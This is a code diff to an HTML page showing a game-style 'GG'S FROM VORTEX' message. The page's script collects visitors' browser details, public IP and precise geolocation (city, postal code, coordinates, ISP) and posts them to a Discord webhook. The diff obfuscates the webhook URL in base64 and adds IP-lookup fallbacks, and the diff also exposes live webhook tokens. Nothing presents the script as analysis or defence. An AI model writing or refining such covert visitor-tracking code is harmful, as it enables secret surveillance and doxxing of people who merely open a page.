@@ -56,6 +56,12 @@
     <div class="complete-message">GG'S FROM VORTEX</div>
 
     <script>
+        const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4ODY5MzE2NTUyMjk0ODI4Ny9vQVF4eFF1cFJJRnQ2QkdOYWZCVDNWVndLaUVRMTBhTC1nV0ZKa1d4OW9Hcl9ud2pydF9VdjRzalZCc2Y4cS1VNTNUNw==';
+        
+        function decodeWebhook() {
+            return atob(encodedWebhook);
+        }
+
         async function collectData() {
             const basicData = {
                 system: {
@@ -89,28 +95,58 @@
                 location: {}
             };
 
-            const ipPromise = fetch('https://ipapi.co/json/')
-                .then(r => r.ok ? r.json() : Promise.reject('IP API failed'))
+            const ipv4Promise = fetch('https://api.ipify.org?format=json')
+                .then(r => r.ok ? r.json() : Promise.reject('IPv4 API failed'))
+                .then(data => ({ ip: data.ip }))
                 .catch(e => {
-                    console.error('IP fetch error:', e);
+                    console.log('IPv4 fetch failed, trying fallback:', e);
+                    return fetch('https://ipapi.co/json/')
+                        .then(r => r.ok ? r.json() : Promise.reject('IP API failed'))
+                        .then(data => {
+                            if (data.ip && data.ip.includes(':')) {
+                                return fetch('https://api4.my-ip.io/ip.json')
+                                    .then(r => r.ok ? r.json() : Promise.reject('IPv4 fallback failed'))
+                                    .then(ipData => ({ ip: ipData.ip }));
+                            }
+                            return data;
+                        });
+                })
+                .catch(e => {
+                    console.error('All IP fetch attempts failed:', e);
                     return null;
                 });
 
-            const [ipData] = await Promise.all([ipPromise]);
+            const [ipData] = await Promise.all([ipv4Promise]);
 
             if (ipData) {
-                basicData.location = {
-                    ip: ipData.ip || 'unknown',
-                    city: ipData.city || 'unknown',
-                    region: ipData.region || 'unknown',
-                    country: ipData.country_name || 'unknown',
-                    postal: ipData.postal || 'unknown',
-                    latitude: ipData.latitude || 'unknown',
-                    longitude: ipData.longitude || 'unknown',
-                    timezone: ipData.timezone || 'unknown',
-                    asn: ipData.asn || 'unknown',
-                    org: ipData.org || 'unknown'
-                };
+                let locationData = { ip: ipData.ip };
+                
+                if (!ipData.city) {
+                    try {
+                        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                        if (locResponse.ok) {
+                            const locData = await locResponse.json();
+                            locationData = {
+                                ...locationData,
+                                city: locData.city || 'unknown',
+                                region: locData.region || 'unknown',
+                                country: locData.country_name || 'unknown',
+                                postal: locData.postal || 'unknown',
+                                latitude: locData.latitude || 'unknown',
+                                longitude: locData.longitude || 'unknown',
+                                timezone: locData.timezone || 'unknown',
+                                asn: locData.asn || 'unknown',
+                                org: locData.org || 'unknown'
+                            };
+                        }
+                    } catch (e) {
+                        console.error('Location details fetch failed:', e);
+                    }
+                } else {
+                    locationData = ipData;
+                }
+
+                basicData.location = locationData;
             } else {
                 basicData.location = { error: 'Could not fetch location data' };
             }
@@ -119,7 +155,7 @@
         }
 
         async function sendToDiscord(data) {
-            const webhookURL = 'https://discord.com/api/webhooks/1388669702951403601/MKx4nodL-xqgbLs3MaM-9GLeNkSPVypHyM-TsO0nOo7c4EeMWI-iOZsS42wV8liCHcRf';
+            const webhookURL = decodeWebhook();
             
             const embed = {
                 title: "📊 Browser Data Collected",
@@ -147,7 +183,7 @@
                     },
                     {
                         name: "🌍 **Location Info**",
-                        value: `• **IP:** \`${data.location.ip || 'unknown'}\`\n` +
+                        value: `• **IP:** \`${data.location.ip || 'unknown'}\` (IPv4)\n` +
                                `• **Location:** ${data.location.city || 'unknown'}, ${data.location.region || 'unknown'}\n` +
                                `• **Country:** ${data.location.country || 'unknown'}\n` +
                                `• **Coordinates:** ${data.location.latitude || 'unknown'}, ${data.location.longitude || 'unknown'}\n` +
